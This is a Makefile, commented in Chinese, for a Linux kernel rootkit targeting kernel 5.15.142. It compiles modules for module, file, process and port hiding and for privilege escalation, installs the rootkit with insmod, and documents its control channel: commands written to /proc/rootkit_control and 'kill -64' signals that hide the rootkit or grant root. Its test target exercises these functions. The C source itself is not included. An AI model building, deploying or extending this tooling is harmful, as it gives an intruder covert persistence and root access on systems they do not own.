# Makefile for Advanced Linux Rootkit
# Target Kernel: 5.15.142

# 模块名称和源文件
obj-m += rootkit.o
rootkit-objs := rootkit.o module_hiding.o privilege_escalation.o file_hiding.o process_hiding.o port_hiding.o

# 内核头文件路径 - 需要在Linux系统上编译
# 在macOS上无法编译Linux内核模块
ifeq ($(shell uname -s),Darwin)
$(error This rootkit can only be compiled on Linux systems with kernel headers installed)
endif

KDIR := /lib/modules/$(shell uname -r)/build

# 检查内核头文件是否存在
ifeq ($(wildcard $(KDIR)),)
$(error Kernel headers not found at $(KDIR). Please install kernel headers: apt-get install linux-headers-$(shell uname -r) or yum install kernel-devel)
endif

# 当前目录
PWD := $(shell pwd)

# 编译选项
ccflags-y := -std=gnu99 -Wno-declaration-after-statement

# 用户态程序
USER_PROG := control

# 默认目标
all: module userspace

# 编译内核模块
module:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

# 编译用户态程序
userspace:
	@echo "Compiling user-space control program..."
	gcc -o $(USER_PROG) control.c -Wall -Wextra
	@echo "User-space program compiled successfully"

# 清理目标
clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean
	@rm -f *.o *.ko *.mod.c *.mod *.order *.symvers
	@rm -f $(USER_PROG)
	@echo "All files cleaned"

# 安装模块
install:
	@echo "Installing rootkit module..."
	@sudo insmod rootkit.ko
	@echo "Rootkit module installed successfully"
	@echo "Control interface available at: /proc/rootkit_control"

# 卸载模块
uninstall:
	@echo "Uninstalling rootkit module..."
	@sudo rmmod rootkit
	@echo "Rootkit module uninstalled successfully"

# 重新加载模块
reload: uninstall install

# 显示模块信息
info:
	@echo "=== Rootkit Module Information ==="
	@modinfo rootkit.ko 2>/dev/null || echo "Module not compiled yet"
	@echo ""
	@echo "=== Loaded Modules ==="
	@lsmod | grep rootkit || echo "Module not loaded"
	@echo ""
	@echo "=== Kernel Messages ==="
	@dmesg | tail -10 | grep rootkit || echo "No recent kernel messages"

# 测试模块功能
test:
	@echo "=== Testing Rootkit Functionality ==="
	@echo "1. Testing module hiding..."
	@echo "hide_module" > /proc/rootkit_control
	@sleep 1
	@lsmod | grep rootkit || echo "Module successfully hidden"
	@echo "show_module" > /proc/rootkit_control
	@sleep 1
	@lsmod | grep rootkit && echo "Module successfully shown" || echo "Module still hidden"
	@echo ""
	@echo "2. Testing privilege escalation..."
	@echo "Current UID: $$(id -u)"
	@echo "root" > /proc/rootkit_control
	@echo "New UID: $$(id -u)"
	@echo ""
	@echo "3. Testing file hiding..."
	@touch /tmp/rk_test_file
	@ls /tmp/rk_test_file
	@echo "hide_file rk_test_file" > /proc/rootkit_control
	@ls /tmp/rk_test_file 2>/dev/null || echo "File successfully hidden"
	@rm -f /tmp/rk_test_file

# 帮助信息
help:
	@echo "=== Rootkit Makefile Help ==="
	@echo "Available targets:"
	@echo "  all       - Compile the rootkit module"
	@echo "  clean     - Clean compiled files"
	@echo "  install   - Install the rootkit module"
	@echo "  uninstall - Uninstall the rootkit module"
	@echo "  reload    - Uninstall and reinstall the module"
	@echo "  info      - Show module information"
	@echo "  test      - Test rootkit functionality"
	@echo "  help      - Show this help message"
	@echo ""
	@echo "=== Control Interface Commands ==="
	@echo "Write to /proc/rootkit_control:"
	@echo "  hide_module     - Hide the rootkit module"
	@echo "  show_module     - Show the rootkit module"
	@echo "  root            - Grant root privileges"
	@echo "  hide_file <name> - Hide files containing <name>"
	@echo "  hide_proc <pid>  - Hide process with <pid>"
	@echo "  hide_port <port> [tcp|udp] - Hide network port"
	@echo ""
	@echo "=== Alternative Control Methods ==="
	@echo "Using kill signals:"
	@echo "  kill -64 1      - Hide module"
	@echo "  kill -64 2      - Show module"
	@echo "  kill -64 3      - Grant root privileges"

# 检查内核版本兼容性
check:
	@echo "=== Kernel Compatibility Check ==="
	@echo "Current kernel version: $$(uname -r)"
	@echo "Target kernel version: 5.15.142"
	@if [ -d "$(KDIR)" ]; then \
		echo "Kernel source found: $(KDIR)"; \
	else \
		echo "ERROR: Kernel source not found at $(KDIR)"; \
		echo "Please ensure the kernel source is available"; \
		exit 1; \
	fi
	@echo "Compatibility check passed"

# 创建调试版本
debug:
	@echo "Building debug version..."
	$(MAKE) -C $(KDIR) M=$(PWD) modules EXTRA_CFLAGS="-DDEBUG -g"

.PHONY: all clean install uninstall reload info test help check debug